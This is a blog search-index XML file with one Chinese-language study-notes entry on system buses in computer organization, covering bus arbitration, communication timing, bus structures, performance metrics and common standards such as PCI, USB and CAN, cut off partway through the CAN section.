<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【计算机组成原理】系统总线</title>
      <link href="/2024/03/14/"/>
      <url>/2024/03/14/</url>
      
        <content type="html"><![CDATA[<h1 id="总线概述"><a href="#总线概述" class="headerlink" title="总线概述"></a>总线概述</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>定义：<strong>总线(BUS)</strong>是计算机各个部件（或系统）之间传递信息的一组共享的电导线</p><blockquote><p>每根导线负责传递一个电脉冲信号，即一位二进制数据</p><p>若干根导线即可同时传输若干位二进制数据</p></blockquote><p>组成：总线一般由<strong>传输线+接口+总线控制器</strong>组成</p><p>传输线包括：</p><script type="math/tex; mode=display">传输线\begin{cases}信息线\begin{cases}数据总线\\地址总线\\控制总线\end{cases}\\电源线\\地线等\end{cases}</script><p>总线从逻辑上有：1.输入 2.输出 3.断开   三种状态</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><p>按传输信息性质分：地址总线、数据总线、控制总线</p><p>按连接部件分：系统总线（处理器总线）、输入输出总线（I/O总线）</p><p>​                                           </p><p>按照计算机系统中的位置分为：片内总线、底板总线、板间总线、通信总线</p><p>包括：插头、插座的几何形状与尺寸、引脚的数量和排列方式、固定方式</p><p>对通信总线，根据所传数据位数又可以分为：串行总线（一根）、并行总线（多根）</p><blockquote><p>总线传递的是数据和命令</p></blockquote><h3 id="电气特性"><a href="#电气特性" class="headerlink" title="电气特性"></a>电气特性</h3><p>定义了每根传输线上信号的<strong>传递方向</strong>和<strong>有效电平范围</strong></p><p>按允许信息传输的方向分：单向总线和双向总线</p><p>双向总线又分为全双工和半双工</p><blockquote><p>全双工指同一时刻允许信息分别沿两个方向传输</p><p>半双工指同一时刻只允许信息沿一个方向传输</p></blockquote><p>多数总线信号采用正逻辑</p><blockquote><p>高电平定义逻辑1</p></blockquote><h3 id="时间特性"><a href="#时间特性" class="headerlink" title="时间特性"></a>时间特性</h3><p>规定了每一根传输线上的信号在什么时候有效</p><p>即总线上的各种信号的时序关系</p><h3 id="总线技术特点"><a href="#总线技术特点" class="headerlink" title="总线技术特点"></a>总线技术特点</h3><p>1.使系统中的连线大大减少，可靠性高</p><p>2.便于硬件和软件的标准化，便于接口设计</p><p>3.易于系统模块化，可替换性好</p><p>4.便于维修。可维护性好</p><p>5.分时传送，任意时刻只有一个源发送，可以由多个部件接收</p><p>6.有仲裁机制</p><p>7.缺点：传输率受带宽限制 ，总线若故障，系统瘫痪</p><h1 id="总线控制"><a href="#总线控制" class="headerlink" title="总线控制"></a>总线控制</h1><h2 id="总线控制的功能和特点"><a href="#总线控制的功能和特点" class="headerlink" title="总线控制的功能和特点"></a>总线控制的功能和特点</h2><p>总线控制就是管理总线的使用</p><script type="math/tex; mode=display">\begin{cases}总线资源的管理\begin{cases}资源：存储空间、I/O空间、中断、通道\\管理：资源分配、冲突判定、设备选择、启动、复位\\\end{cases}\\总线仲裁\\总线定时（通信控制）\\总线连接，实现不同总线协议的转换\\\end{cases}</script><blockquote><p>特点：总线控制的功能由总线控制器来完成。而总线控制器在实现技术上并不一定存在一个独立的控制器模块。它的功能可能分布在总线的各个部件或设备上。</p></blockquote><h2 id="总线仲裁"><a href="#总线仲裁" class="headerlink" title="总线仲裁"></a>总线仲裁</h2><h3 id="总线设备分类"><a href="#总线设备分类" class="headerlink" title="总线设备分类"></a>总线设备分类</h3><p>按控制能力分：总线主设备和主线从设备</p><blockquote><p>总线主设备对总线具有控制能力，是信息传送的发起者</p><p>总线从设备对总线没有控制权，只能响应总线命令</p></blockquote><p>按信息传送分：总线源设备和总线目的设备</p><p>按访问控制分：存储器设备和I/O设备</p><h3 id="总线仲裁分类"><a href="#总线仲裁分类" class="headerlink" title="总线仲裁分类"></a>总线仲裁分类</h3><blockquote><p>从不同角度有不同分类方法</p></blockquote><p>根据仲裁电路结构：串行仲裁和并行仲裁</p><p>优先排队策略：固定优先级和动态优先级</p><p>仲裁电路分布：集中仲裁和分布仲裁</p><p>设备状态：设备请求方式（主动）和控制器查询方式（被动）</p><h3 id="集中仲裁的方式和特点"><a href="#集中仲裁的方式和特点" class="headerlink" title="集中仲裁的方式和特点"></a>集中仲裁的方式和特点</h3><h4 id="链式查询"><a href="#链式查询" class="headerlink" title="链式查询"></a>链式查询</h4><blockquote><p>通过一条判优链路（优先链）对所有主设备逐个串行进行查询</p></blockquote><p>有三条线：BS总线忙、BR总线请求、BG总线同意</p><p>如图：</p><p><img src="/2024/03/14/链式查询.png" alt="链式查询"></p><p>查询方法：</p><p>从离总线控制部件最近的设备开始查。首先查到的肯定是提出请求设备中优先权最高的一个。查到设备后，该设备通过总线忙卡断判优链路，占用总线；当操作结束后，该设备应当及时释放总线</p><p>特点：</p><ol><li>结构简单，易于扩充设备</li><li>对电路故障<strong>很敏感</strong></li><li>仲裁公平性差，固定优先级</li></ol><h4 id="计数器定时查询"><a href="#计数器定时查询" class="headerlink" title="计数器定时查询"></a>计数器定时查询</h4><blockquote><p>多加了设备地址线</p></blockquote><p><img src="/2024/03/14/计数器查询.png" alt="计数器查询"></p><p>查询方式：</p><p>  查询开始，计数器计数。每计一次数，就将计数值作为设备地址发往各个设备。每个申请总线的设备对地址进行识别，地址符合的设备获得总线控制权，停止计数。   </p><p>优先级设定：由计数初值决定最高优先级，3种方法。  </p><p>  a.查询时计数器从‘0’开始计数，即0号设备的优先级最高；    </p><p>  b.查询时计数器从上一次查询的终止点开始计数，则终止点优先级最高。此时优先级是循环的；   </p><p>  c.计数初值由程序设定，此时优先级可编程改变。</p><p>特点：</p><ol><li>软件查询、优先级控制方式灵活</li><li>对电路故障<strong>不敏感</strong></li><li>控制较复杂（增加了设备地址线）</li></ol><h4 id="独立请求方式"><a href="#独立请求方式" class="headerlink" title="独立请求方式"></a>独立请求方式</h4><blockquote><p>每个设备都有一组BGBR线</p></blockquote><p><img src="/2024/03/14/独立请求.png" alt="独立请求"></p><p>查询方式：</p><p>   每一个设备专门有一根BR线和BG线，各自通过独立的请求线向总线控制部件发请求，总线控制器里设置并行排队线路，同时接收各设备发来的请求信号并同时进行排队判优，然后通过各自独立的回答线发出总线同意信号。 </p><p>特点：</p><ol><li>响应速度快</li><li>优先级控制灵活</li><li>不适合多设备的场合</li></ol><h2 id="总线通信控制"><a href="#总线通信控制" class="headerlink" title="总线通信控制"></a>总线通信控制</h2><p>为了完成一次有效的通信，源设备与目的设备之间需要进行一系列有时序限制的操作。为此，通信双方需要“感知”对方的操作及操作效果，这个“感知”由总线通信控制来实现的。</p><p>总线通信控制方法分两大类：无须感知和需要感知</p><p>无需感知指通信双方相互信任，每一个通信步骤都会在规定的时间内正确完成；</p><p>如果通信双方不能完全相互信任则需要感知</p><p>基于“无须感知”观点进行总线通信控制的通信称为同步通信，基于“需要感知”观点进行总线通信控制的通信称为异步通信。</p><h2 id="总线通信控制-1"><a href="#总线通信控制-1" class="headerlink" title="总线通信控制"></a>总线通信控制</h2><blockquote><p>目的是要解决通信双方协调配合问题</p></blockquote><script type="math/tex; mode=display">总线传输周期\begin{cases}申请分配阶段 \space 主模块申请，总线仲裁决定\\寻址阶段 \space 主模块向从模块给出地址和命令\\传数阶段 \space 主模块和从模块交换数据\\结束阶段 \space 主模块撤销有关信息\end{cases}</script><p><strong>总线周期</strong>：</p><p><strong>一次完整的总线传送操作所需时间称为总线周期</strong></p><p>总线周期的基本类型:内存读   内存写  外设读  外设写</p><p>正常总线周期：由一次地址传送时间和一次数据传送时间组成 。 </p><blockquote><p>总线上数据的读/写方向是相对于主模块而言的，即：读：由从模块发送，主模块接收。即从主模块的角度看是读入（接收）； 写：由主模块发送，从模块接收。即从主模块的角度看是向对方写（发送）。</p></blockquote><h3 id="总线通信的四种方式"><a href="#总线通信的四种方式" class="headerlink" title="总线通信的四种方式"></a>总线通信的四种方式</h3><h4 id="同步通信"><a href="#同步通信" class="headerlink" title="同步通信"></a>同步通信</h4><blockquote><p>由统一时钟信号控制数据传送</p></blockquote><p>同步通信是指参与通信的两个部件之间的信息传送是由定宽、定距的时标来控制的。</p><p>每隔一个时标，源设备就向总线发送一个数据，而不去对目的设备是否收到数据进行确认； 同样地，目的设备每隔一个时标就对总线进行采样来获取数据，而不去确认数据是否已发出，也不向源设备确认收到的数据是正确的。</p><p>特点：</p><ol><li>强制性同步，采用统一时钟；简单易控制。</li><li>对于每一个操作，每一时间都有明确的规定，显得比较“死板”</li><li>必须按照工作速度最慢的部件来设计时钟。</li><li>当各个模块的存取时间相差较大时，会大大损失总线的工作效率</li><li>适用于总线长度较短，各模块部件存取时间比较一致的场合</li></ol><p><img src="/2024/03/14/同步通信.png" alt="同步通信" style="zoom:50%;"></p><p><img src="/2024/03/14/同步通信1.png" alt="同步通信" style="zoom:50%;"></p><h4 id="异步通信"><a href="#异步通信" class="headerlink" title="异步通信"></a>异步通信</h4><blockquote><p>采用应答方式，没有公共的时钟标准</p></blockquote><p>异步通信是指参与通信的两个部件需要“感知”对方的操作，这个“感知”是通过“握手”信号实现的。</p><p>异步通信主要应用于：</p><ol><li>工作速率不同的部件之间相互通信</li><li>通信线路受到干扰的场合</li></ol><p>异步通信的“握手”协议分为：</p><ol><li>单边控制 通信过程是由源部件<strong>或</strong>目的部件控制</li><li>双边控制 通信过程由<strong>源部件和目的部件共同控制</strong></li></ol><blockquote><p>异步通信既可以用于并行传送也可以用于串行传送</p></blockquote><p>异步串行通信的数据传输率可以用波特率和比特率来衡量</p><blockquote><p>波特率—单位时间内传送二进制数据的位数，单位：bps</p><p>比特率—单位时间内传送二进制有效数据的位数，单位：bps</p></blockquote><h4 id="半同步通信"><a href="#半同步通信" class="headerlink" title="半同步通信"></a>半同步通信</h4><blockquote><p>同步、异步结合</p></blockquote><p>同步 发送方用时钟前沿发信号 接收方用系统时间后沿判断识别</p><p>异步 允许不同速度的模块和谐工作</p><pre><code>     增加一条等待响应信号WAIT</code></pre><p><img src="/2024/03/14/半同步.png" alt="半同步" style="zoom:50%;"></p><p><img src="/2024/03/14/半同步1.png" alt="半同步" style="zoom:50%;"></p><blockquote><p>上述三种通信的共同点</p><p>一个总线传输周期（以输入数据为例）</p><p>主模块发地址 、命令      占用总线</p><p>从模块准备数据               不占用总线</p><p>从模块向主模块发数据   占用总线</p></blockquote><h4 id="分离式通信"><a href="#分离式通信" class="headerlink" title="分离式通信"></a>分离式通信</h4><blockquote><p>充分挖掘系统总线每瞬间的潜力\</p></blockquote><p>一个总线传输周期</p><script type="math/tex; mode=display">\begin{cases}子周期1 \space 主模块申请占用总线，使用完后即放弃总线的使用权\\子周期2 \space 从模块申请占用总线，将各种信息送至总线上\end{cases}</script><p>特点：</p><ol><li>各模块有权申请占用总线</li><li>采用同步方式通信，不等对方回答</li><li>各模块准备数据时，不占用总线</li><li>总线被占用时，无空闲</li></ol><blockquote><p>充分发挥的总线的有效占用</p></blockquote><h1 id="总线结构"><a href="#总线结构" class="headerlink" title="总线结构"></a>总线结构</h1><h2 id="单总线结构"><a href="#单总线结构" class="headerlink" title="单总线结构"></a>单总线结构</h2><p><img src="/2024/03/14/单总线.png" alt="单总线"></p><p>特点：</p><ol><li>控制简单、便于扩充、造价低</li><li>易形成系统的瓶颈</li></ol><p>缺陷：</p><ol><li>由于各部件只能分时使用总线，系统工作效率低</li><li>总线设备之间传输速率不匹配</li></ol><h2 id="多总线结构"><a href="#多总线结构" class="headerlink" title="多总线结构"></a>多总线结构</h2><blockquote><p>采用多种速率不同的总线，将工作速度相差较大的设备挂在不同的总线上，低速总线作为高速总线的一个设备工作。</p></blockquote><h3 id="双总线结构"><a href="#双总线结构" class="headerlink" title="双总线结构"></a>双总线结构</h3><p><img src="/2024/03/14/双总线.png" alt="双总线"></p><h3 id="三总线结构"><a href="#三总线结构" class="headerlink" title="三总线结构"></a>三总线结构</h3><p><img src="/2024/03/14/三总线.png" alt="三总线"></p><p>PCI总线就是一种三总线结构，由下图可知PCI总线通过PCI桥路与CPU总线相连。这种结构使CPU总线与PCI总线互相隔离，具有更高的灵活性，可以支持更多的高速运行设备，而且具有即插即用的特性。</p><p><img src="/2024/03/14/三总线1.png" alt="三总线1"></p><h3 id="四总线结构"><a href="#四总线结构" class="headerlink" title="四总线结构"></a>四总线结构</h3><blockquote><p>增加了一条与计算机系统紧密相连的高速总线。</p><p>高速设备自身很少依赖处理器，而且比扩展总线的设备更贴近处理器，对高性能的设备与处理器来说，效率有很大提高。</p></blockquote><p><img src="/2024/03/14/四总线.png" alt="四总线"></p><h2 id="总线结构对系统性能的影响"><a href="#总线结构对系统性能的影响" class="headerlink" title="总线结构对系统性能的影响"></a>总线结构对系统性能的影响</h2><p>系统中总线条数越多，系统并行性越好，工作效率越高，结构越复杂，造价越高。系统中总线条数越少，越强调分时使用总线，工作效率越受影响，结构越简单，成本越低。</p><h1 id="总线的性能指标"><a href="#总线的性能指标" class="headerlink" title="总线的性能指标"></a>总线的性能指标</h1><h2 id="位宽"><a href="#位宽" class="headerlink" title="位宽"></a>位宽</h2><p>总线一次同时传送的信息位数或所需的线数。即一次操作可以传输的数据位数。主要是指数据总线的数目。</p><script type="math/tex; mode=display">\begin{cases}S100为8位\\ISA为16位\\EISA为32位\\PCI-2可达64位\end{cases}</script><p>总线的位宽直接影响总线的传输率（吞吐量）。</p><h2 id="工作时钟频率"><a href="#工作时钟频率" class="headerlink" title="工作时钟频率"></a>工作时钟频率</h2><p>控制总线中的时钟信号线所提供的时钟频率。</p><h2 id="标准传输率（总线带宽）"><a href="#标准传输率（总线带宽）" class="headerlink" title="标准传输率（总线带宽）"></a>标准传输率（总线带宽）</h2><p>总线上每秒钟能传输的最大字节量。以MB/S表示</p><p>总线本身所能达到的最高传送速率</p><p><strong>总线带宽＝总线位宽×总线工作频率/8</strong></p><h2 id="负载能力"><a href="#负载能力" class="headerlink" title="负载能力"></a>负载能力</h2><p>总线上所能连接部件的最大个数</p><h2 id="总线复用"><a href="#总线复用" class="headerlink" title="总线复用"></a>总线复用</h2><p>物理线路是一组，功能上地址线 与 数据线 复用――分时复用。</p><h2 id="总线定时协议（握手机制）"><a href="#总线定时协议（握手机制）" class="headerlink" title="总线定时协议（握手机制）"></a>总线定时协议（握手机制）</h2><p>依据数据传输采用何种时钟控制，可分为同步、异步、半同步、分离式</p><h2 id="几种常见总线的性能"><a href="#几种常见总线的性能" class="headerlink" title="几种常见总线的性能"></a>几种常见总线的性能</h2><p><img src="/2024/03/14/总线性能.png" alt="总线性能"></p><h1 id="常用总线标准"><a href="#常用总线标准" class="headerlink" title="常用总线标准"></a>常用总线标准</h1><blockquote><p>总线标准：</p><p>为适应模块化设计，使各生产厂家的产品具有可组合性和可替换性，需要对总线进行规范，提出一种标准的信息传递通道。</p><p>总线标准分为两类：</p><p>一类是由国际权威机构制定的（ RS—232C  是美国电子工业协会（EIA）制定的） ，另一类是由某厂家设计而广泛流行的（PCI总线：Intel联合IBM，Compaq等100多家公司联合共同开发）</p></blockquote><h2 id="系统总线"><a href="#系统总线" class="headerlink" title="系统总线"></a>系统总线</h2><h3 id="S-100总线"><a href="#S-100总线" class="headerlink" title="S-100总线"></a>S-100总线</h3><p>S-100总线产生于1975年，第一个标准化总线，它有l00条信号线，是为8080微处理器设计的。</p><p>这种总线的主要缺点：</p><p>1）布线不合理，时钟信号线位于9条控制信号线之间，容易造成串扰；</p><p>2）只规定了两条地线，接地点太少，容易造成地线干扰；</p><p>3）对DMA传送虽然作了考虑，但对所需引脚并未明确定义；</p><p>4）将＋8V与－18V电源紧排在一起，又没有保护措施，一旦插入操作有误，使＋8V与－18V相碰，轻则损坏电压调整器，重则使接到＋5V上的所有集成电路报废。</p><p>没有总线仲裁机构，因此不适于多处理器系统。这种总线目前已很少有人使用。</p><h3 id="IBM-PC总线和ISA总线"><a href="#IBM-PC总线和ISA总线" class="headerlink" title="IBM PC总线和ISA总线"></a>IBM PC总线和ISA总线</h3><p>IBM PC总线是IBM PC/XT个人计算机采用的微型机总线。它是针对Intel 8088微处理器设计的，有62条信号线，以适应8088的8位数据线和20位地址线。      为了和Inte1 80286等高性能16位微处理器兼容，IBM公司在PC总线基础上增加了一个36引脚的AT扩展插座而形成AT总线。在IBMPC/AT及其兼容机的机箱中，通常在母板上分别设置几个AT插槽和PC插槽，这种结构也称之为IBM公司的ISA结构(即工业标准结构)。IBM PC/AT总线也称为ISA总线。      ISA是将微处理器芯片总线经缓冲直接映射到系统总线上，也是一种原始的总线设计。并且，ISA总线没有支持总线仲裁的硬件逻辑，所以不支持多主设备系统。       现在，ISA总线仍然被使用，特别是在工控机中。但在这种微机系统中，为了发挥32位微处理器的性能，往往把主板上的存储器直接连到CPU的芯片总线上，而ISA总线仅作为扩展I/O模块的总线。</p><h3 id="PC-104总线"><a href="#PC-104总线" class="headerlink" title="PC-104总线"></a>PC-104总线</h3><p>采用超小尺寸插卡；自叠总线结构；总线驱动电流小，功耗低。现在大量地用于工业控制系统中，在信号上与ISA总线兼容。</p><h3 id="Multibus-Ⅰ和Ⅱ"><a href="#Multibus-Ⅰ和Ⅱ" class="headerlink" title="Multibus Ⅰ和Ⅱ"></a>Multibus Ⅰ和Ⅱ</h3><p>Intel公司的Multibus总线是一种能支持多处理器并行运行的总线。这种总线实际存在多种总线概念，即包括系统总线、局部总线、和板上I/O扩展总线SBX、LBX。这也是多总线(Multibus)得名的由来。     MultibusⅠ支持8位、16位的微处理器，采用单功能模板概念，适用于工业控制。MultibusⅡ支持32位微处理器。 </p><h3 id="VME总线"><a href="#VME总线" class="headerlink" title="VME总线"></a>VME总线</h3><p>MOTOTOLA公司的VME总线（IEEE（美国电子电机工程师协会） 1014标准）也是一种支持多计算机/多处理器的系统总线。    支持16、32位微处理器，支持四个主CPU模板并行运行。 这种高性能总线是开放式总线结构，受到许多厂家，特别是欧洲以及那些与Motorola68000微处理器有关的用户欢迎。</p><h3 id="微通道MCA"><a href="#微通道MCA" class="headerlink" title="微通道MCA"></a>微通道MCA</h3><p>BM公司于1987年推出微通道总线(Micro Channel Architecture)，即MCA。它是带有 24位DMA的10MHz总线，提供16MB的寻址能力，32位数据总线。它配有总线仲裁机构，可支持16个总线主控器。    </p><p>优点：</p><p>它是一个经过很好定义的32位总线标准，有利于形成更好更可靠的产品。   </p><p> 缺点：</p><p>缺乏与已有硬件的兼容性，非开放式结构。微通道的研制成功，彻底改变了IBM公司于1981年为IBM PC扩展而建立的开放式硬件标准，回到了的老路。微通道与PC机的非兼容性为它自身的发展造成了困难。</p><h3 id="EISA总线-Extend-industry-Standard-Architecture"><a href="#EISA总线-Extend-industry-Standard-Architecture" class="headerlink" title="EISA总线(Extend  industry Standard  Architecture)"></a>EISA总线(Extend  industry Standard  Architecture)</h3><p>以Compaq为首联合起来推出的。     </p><p> EISA是ISA总线的扩展，它既保持了与老的IBM PC系列机兼容，又具有MCA的先进性，但不与MCA兼容。      </p><p><strong>该总线作为ISA总线完全兼容的扩展</strong>，支持多个总线主控器，并加强了DMA功能，增加了突发方式传输，是一种支持多处理机的高性能<strong>32位</strong>标准总线。</p><h3 id="采用总线复用技术的Q总线和NUBUS"><a href="#采用总线复用技术的Q总线和NUBUS" class="headerlink" title="采用总线复用技术的Q总线和NUBUS"></a>采用总线复用技术的Q总线和NUBUS</h3><p>Q总线：DEC公司的工业总线，它采用复用数据线和地址线的办法来支持16位和32位微型化的小型机。      </p><p>NUBUS：APPLE公司和TI公司提出的，则采用数据总线、地址总线和控制总线三条总线复用44条信号线，另加5条总线仲裁，可支持32位微处理器。APPLE和TI公司希望用这种总线取代微通道总线。 </p><h3 id="STD总线"><a href="#STD总线" class="headerlink" title="STD总线"></a>STD总线</h3><p>1987年，STD总线最初的设计目标是和所有8位微处理器相兼容，以小尺寸(4.5in×6.5in)、高可靠性、低价格的面貌出现，为嵌入式系统提供解决手段。通常人们把STD总线称为“兰领总线”，因为它把侧重点放在工业测控应用上。    16位微处理器出现后，为了仍旧能使用该总线，采用周期窃取和总线复用技术来扩充地址线和数据线，所以STD是8位/16位兼容的总线。为了能和32位微处理器80386、80486、68030等兼容，近年来又定义了STD32总线标准，且与原来8位总线的I/O模板兼容。 </p><h2 id="局部总线"><a href="#局部总线" class="headerlink" title="局部总线"></a>局部总线</h2><blockquote><p>局部总线是为解决高性能CPU与低性能的系统总线之间的瓶颈问题而提出的。出于对兼容性的考虑，还不能将ISA总线淘汰掉，所以需要一个变通办法来解决该瓶颈，办法之一就是采用局部总线。</p></blockquote><p>高性能CPU的芯片总线可以支持很高的数据传输率，因而可将某些模块直接挂接在芯片总线上，实际上许多主板上的存储器都是采用该方法。但对于多个模块，CPU的芯片总线驱动就能力不够了，因而需增加驱动电路，这样就形成了局部总线，它为CPU和高速的外设间提供了一条直接通路。</p><h3 id="VL-BUS"><a href="#VL-BUS" class="headerlink" title="VL-BUS"></a>VL-BUS</h3><p>VESA（视频电子标准协会）与60余家公司联合推出的局部总线；32bit总线，在标准的ISA插槽之后提供附加的第三和第四接口，额定频率33MHz，并且能够提供超过ISA的卓越性能。    </p><p>VL-BUS最主要的特点也是其没落的最主要原因。本来，它是作为486处理器/内存总线的直接扩展，运行在与处理器相同的频率上，因此名为“本地总线”。这种直接的扩展意味着如果连接的设备过多，则很可能会干扰处理器自身的工作，特别是当信号通过一个插槽时。VESA建议在33MHz的频率上只使用2个插槽，或者在总线使用电子缓冲时使用3个。在更高的频率上不能连接2个以上的设备，而在50MHz时它们则必须都内建于主板内。</p><h3 id="PCI总线"><a href="#PCI总线" class="headerlink" title="PCI总线*"></a>PCI总线*</h3><p>PCI总线是厂家自发制定的一种企业联盟标准总线，是专门为奔腾系列芯片而设计，可满足图形界面及高速传输率扩展卡的需求。Intel公司于1991年首先提出了PCI总线的概念。之后，Intel联合IBM，Compaq等100多家公司联合共同开发PCI总线，并于1993年推出了PCI总线标准。因局部总线PCI等非常流行和普及，现在大多数人认为局部总线PCI等就是系统总线。因此，局部总线和系统总线没有本质区别，现在统称为系统总线。   </p><p>PCI总线的特点:</p><ol><li>独立于处理器。工作频率与CPU时钟无关，可支持多机系统及未来的处理器。</li><li>传输效率高。支持64位数据总线，总线速度为66MHz，最大数据传输率达528MB/s。</li><li>多总线共存。PCI有良好的兼容性，可支持ISA，EISA，MCA，SCSI，IDE等多种总线，同时还预留了发展空间。</li><li>支持两种电压。PCI提供两种信号环境：5V和3.3V，并可进行两种环境的转换，扩大了的适应范围。</li><li>具有即插即用功能。PCI标准允许PCI局部总线扩展卡和元件进行自动配置，提供了即插即用的能力。 </li><li>合理的管脚安排。PCI总线采用数据线和地址线复用结构，减少了总线的引用脚数，从而可节省线路空间降低设计成本，目标设备可用47引脚，总线主控设备可用49引脚。</li><li>PCI对32位与64位总线的使用是透明的，它允许32位与64位器件相互协作。</li><li>支持突发传输，支持总线主控方式，采用同步操作。</li></ol><h2 id="设备总线"><a href="#设备总线" class="headerlink" title="设备总线"></a>设备总线</h2><blockquote><p>计算机与外部设备的信息交换称为通信，这里的设备可以是外部设备，也可以是计算机。设备总线，也称为通信总线，就是实现计算机或外部设备间互连的一类总线。按通信方式可分为并行总线和串行总线。</p></blockquote><h2 id="RS-232C"><a href="#RS-232C" class="headerlink" title="RS-232C"></a>RS-232C</h2><p>是美国电子工业协会（EIA）与BELL等公司一起开发的1969年颁布的数据通信协议。字母RS表示Recommanded  Standard（推荐标准），232是识别代码，C是标准的版本号。</p><p>RS232C总线的特点：</p><ol><li>可实现双工通信</li><li>具有多种传输速率，可适应不同速率的外设</li><li>采用串行传输方式，传输距离远 </li><li>采用负逻辑，抗干扰能力强</li></ol><h3 id="SCSI总线-small-computer-system-interface"><a href="#SCSI总线-small-computer-system-interface" class="headerlink" title="SCSI总线(small computer system interface)"></a>SCSI总线(small computer system interface)</h3><p> SCSI是小型计算机系统接口简称。SCSI接口是高速硬盘接口规范，采用8/16/32位并行总线，可用于硬盘、光盘、扫描仪、打印机、磁带机等多种外围设备的连接。</p><h3 id="ATA（AT-Attachment）"><a href="#ATA（AT-Attachment）" class="headerlink" title="ATA（AT Attachment）"></a>ATA（AT Attachment）</h3><p>又称<strong>IDE</strong>（Integrated Drive Electronics）。从1985年上市到1992年，它一直是纯硬盘驱动接口。为了与SCSI竞争，WD公司推出了增强型IDE标准EIDE，即ATA-2标准，ATA-2不仅可以连接硬盘，而且可以连接CD-ROM磁带机等存储设备，它允许接4台设备，支持大于528MB的硬盘容量。</p><h3 id="IEEE488"><a href="#IEEE488" class="headerlink" title="IEEE488"></a>IEEE488</h3><p>是HP公司在20世纪70年代为解决各种仪器仪表与各类计算机接口互不兼容的问题而研制的通用接口总线HP-IB。1975年IEEE委员会以IEEE488标准予以推荐。</p><p>IEEE488总线包括8条双向数据线，3条字节传送控制线和5条通用控制线，它可以将计算机，电压表，电源，频率发生器等装置通过一条488总线电缆连接起来。IEEE488系统以机架层叠式智能仪器为主要器件，可以以积木方式构成开放式系统。</p><h3 id="Centronics"><a href="#Centronics" class="headerlink" title="Centronics"></a>Centronics</h3><p>Centronics是一个打印机厂商的名字，也是一种较早推出的计算机与打印机和绘图仪进行连接的并行总线。该总线由36个信号线构成，采用扁平电缆或多芯电缆 进行8位数据传输，传输率为100KB/s，最大传送距离为2m。在用扁平电缆做传输线时，每两条传输线之间加一条地线，较好的克服了数据间的干扰。这种总线应用非常广泛，有多外设通过Centronics总线和计算机进行通信，例如：编程器、大容量软盘驱动器和刻录光驱等。</p><h3 id="USB-UNIVERSAL-SERIAL-BUS"><a href="#USB-UNIVERSAL-SERIAL-BUS" class="headerlink" title="USB(UNIVERSAL SERIAL BUS )  *"></a>USB(UNIVERSAL SERIAL BUS )  *</h3><p>USB总线是1994年以Intel为首包括Compad、HP、Lucent、Microsoft、NEC、Philips7家公司联合发布的新一代通用串行总线。1996年推出了标准版本USB1.0， 2000年又推出了标准版本USB2.0, 2008年发布了USB3.0标准，最大传输带宽高达625MB/s。USB有可能取代许多总线标准，成为微机与许多外设或系统进行连接的主要或唯一的途径。</p><p>USB的特点  ：</p><blockquote><p>USB是一种快速的、双向的、同步的、低成本的可动态加入的串行总线。它有许多优良的性能。</p></blockquote><ol><li><strong>提供热即插即用功能</strong>       连接外设不必打开机箱，也不必关闭主机电源，能够自我识别外设，能自动在驱动器与配置间进行功能映射；可动态地加入与重新配显外设。</li><li><strong>适用范围很宽</strong>       它适用于带宽从几Kb/s到几百Mb/s范围的设备，即可连接键盘、鼠标、摄像头、游戏设备、虚拟现实外设的低速设备，也可连接电话、声卡、麦克风、压缩视频这样的全速设备，还可以连接视频、存储器、图像这样的高速设备。</li><li><strong>总线利用率高</strong>       支持同一束电缆上的同步以及异步传输，支持多设备的并行操作，支持最多127个物理设备，支持主机与设备间的多数据和消息流传输；允许接入复合设备。因为协议的额外开销较低，所以总线利用率很高。</li><li><strong>传输灵活</strong>       它允许传送不同大小的包，并通过适配包的大小与等待时间来允许设备数据率有一定范围的变化；它在协议中建立了用于缓冲处理的流控制。</li><li><strong>机制强壮</strong>      它在协议中建立了错误处理/故障恢复机制；可在被用户察觉的时间内识别动态加入和退出的设备，并支持故障设备的识别。</li><li><strong>提供了低成本的实现方案</strong>       它对外设与主机硬件中的集成进行了优化；适应低成本外设的开发；提供低成本电缆和连接器使用商品技术；USB结构可以升级为在一个系统中支持多个USB主机控制器。</li><li><strong>生命力强</strong>       USB是一种开放性的不具有专利版权的工业标准，因此不存在版权问题，具有强大的生命力。</li></ol><p>USB总线支持以下三种数据速率传输：</p><p>USB高速(high-speed)信号传输位速率为480Mb/s；</p><p>USB全速(full—speed)信号传输位速率为12Mbs；</p><p>有限能力的低速(low-speed)信号传输模式位速率为1.5Mb/s。</p><h3 id="IEEE1394"><a href="#IEEE1394" class="headerlink" title="IEEE1394"></a>IEEE1394</h3><p>是IEEE在APPLE公司的高速串行总线Fire wire（火线）基础上制定的串行总线标准。    1394具有更多的外设支持能力，尤其在影视多媒体方面有优异的支持能力；使用存储器映射地址总线；有真正的即插即用和热插拔能力；提供更长的电缆（设备间4.5m，总线末端间为72m）和更高的速率（数据传输率为50Mb/s、100Mb/s、400Mb/s）。1394十分容易配置，它采用6线连接，树状结构，最多可接63个设备。在存储设备接口中，IEEE1394被认为将有可能取代SCSI及ATA接口。1997年Seagate及Maxtor分别于Comdex’97中展示了1394接口硬盘驱动器的雏形机种，1995年10月，Sony在可摄式录象机上首先将1394接口列为标准。    总之，IEEE1394是一种高速外设总线，就是面对高速外设 的。</p><h3 id="CAN总线"><a href="#CAN总线" class="headerlink" title="CAN总线"></a>CAN总线</h3><p>1986年2月，在SAE（汽车工程人员协会）大会上，Rober Bosch公司提出CAN。这个由Bosch公司设计的新的总线系统．称之为“Automotive Serial Controller Area Network”（汽车串行控制局域网）    1987年， Intel公司推出第一片CAN控制芯片——82526。它是CAN协议的第一个在硬件上的实现。 </p><p>特点：</p><ol><li>CAN是到目前为止唯一有国际标准的现场总线。</li><li>CAN为多主方式工作，网络上任一节点均可在任意时刻主动地向网络上其他节点发送信息，而不分主从。</li><li>在报文标识符上，CAN 上的节点分成不同的优先级，可满足不同的实时要求，优先级高的数据最多可在134μs内得到传输。</li><li>CAN采用非破坏总线仲裁技术。当多个节点同时向总线发迭信息出现冲突时，优先级较低的节点会主动地退出发送，而最高优先级的节点可不受影响地继续传输数据， CAN节点只需通过对报文的标识符滤波即可实现点对点、一点对多点及全局广播等几种方式传送接收数据。</li><li>CAN的直接通信距离最远可达 11 km；通信速率最高可达1Mbps。</li><li>CAN 上的节点数主要取决于总线驱动电路，目前可达 